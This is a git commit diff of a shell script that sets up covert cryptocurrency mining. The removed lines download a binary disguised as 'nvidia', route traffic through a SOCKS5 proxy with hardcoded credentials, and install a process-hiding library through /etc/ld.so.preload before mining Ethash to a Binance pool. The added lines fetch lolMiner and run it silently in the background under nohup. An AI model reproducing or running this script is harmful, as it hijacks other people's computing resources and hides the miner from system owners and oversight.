5b444d6cab5fa1556afe819adbead765cfc9cbb6
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2022-05-30 01:56:16 -0600

    Update 14.sh

--- 14.sh
+++ 14.sh
@@ -1,48 +1,7 @@
-#!/bin/sh
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
-
-apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
-
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
-
-tar -xvzf graphics.tar.gz
-
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 103.253.24.243:8080
-socks5_username =  woiden_dorin
-socks5_password =  keramat123
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-echo " "
-echo " "
-
-echo "**"
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-echo " "
-
-echo "**"
-
-echo " "
-echo " "
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/nvidia
-chmod +x nvidia
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicNvidia.zip
-unzip magicNvidia.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-./graftcp/graftcp ./nvidia -a ETHASH --pool stratum+tcp://ethash.poolbinance.com:1800 --user teguhcong --worker nvidia --longstats 5 --shortstats 5 --timeprint on --log on --ethstratum ETHPROXY --basecolor
+#!/bin/bash
+nvidia-smi
+sudo apt update -y
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
+tar -xf lolMiner_v1.29_Lin64.tar.gz
+cd 1.29 && nohup bash -c "./lolMiner --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:1800 --user teguhcong.GPU-Win-$(echo $(shuf -i 1-99 -n 1))--vapers --ethstratum ETHPROXY &> /dev/null 2>&1&"
+#
